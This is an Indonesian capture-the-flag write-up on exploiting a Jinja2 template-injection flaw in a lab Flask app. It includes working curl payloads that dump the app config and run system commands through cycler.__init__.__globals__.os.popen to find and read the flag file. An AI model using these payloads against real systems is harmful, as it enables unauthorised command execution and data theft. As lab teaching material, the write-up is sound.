CTF Writeup: SSTI (Insecure Dropdown)
1. Deskripsi Tantangan
Tantangan ini menyajikan sebuah aplikasi web sederhana berbasis Flask yang menanyakan model AI favorit pengguna. Terdapat dua input: sebuah dropdown menu di /announce dan sebuah input teks di /.

2. Tahap Identifikasi (Detection)
Langkah pertama adalah melakukan testing apakah input tersebut dirender oleh template engine di sisi server. Digunakan payload matematis standar:

Payload: {{7*7}}

Target: Parameter ai pada endpoint /announce.

Hasil: Server merespons dengan angka 49.

Hal ini mengonfirmasi adanya celah Server-Side Template Injection (SSTI) menggunakan engine Jinja2 (Python).

3. Tahap Eksplorasi (Exploration)
Setelah celah ditemukan, dilakukan pengecekan terhadap objek config untuk melihat informasi sensitif di lingkungan Flask.

Command:

Bash
curl -X POST -d "user={{config}}" http://10.42.5.10:5000/
Hasil: Muncul konfigurasi aplikasi, namun tidak ada flag langsung di sana.

4. Tahap Eksploitasi (Remote Code Execution)
Untuk mendapatkan flag, kita perlu melakukan eksekusi perintah sistem (RCE). Kita memanfaatkan objek cycler yang tersedia di Jinja2 untuk mencapai modul os.

Langkah A: Mencari Lokasi Flag
Digunakan perintah find untuk mencari file dengan nama "flag".

Command:

Bash
    curl -s -X POST 'http://10.42.5.10:5000/announce' \
    --data-urlencode "ai={{cycler.__init__.__globals__.os.popen('find / -maxdepth 2 -name \"*flag*\"').read()}}"
    ```
*   **Hasil:** Ditemukan file di `/flag.txt`.

**Langkah B: Membaca Flag**
Gunakan `cat` untuk membaca isi file tersebut.
*   **Command:**
    
```bash
    curl -s -X POST 'http://10.42.5.10:5000/announce' \
    --data-urlencode "ai={{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}"
    ```

### **5. Flag**
> **`RAM{ins3cure_dr0pdown}`**
